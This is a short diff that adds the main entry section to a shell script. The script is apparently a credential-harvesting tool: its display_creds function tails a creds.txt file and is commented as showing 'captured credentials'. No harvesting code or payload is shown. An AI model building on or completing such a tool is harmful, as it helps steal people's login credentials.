@@ -145,3 +145,17 @@ display_creds() {
     echo "Waiting for credentials..."
     tail -f creds.txt
 }
+
+# Main script starts here
+
+# Clear the terminal
+clear_terminal
+
+# Display the big welcome message
+big_welcome
+
+# Call the menu function to start
+menu
+
+# Continuously display captured credentials
+display_creds
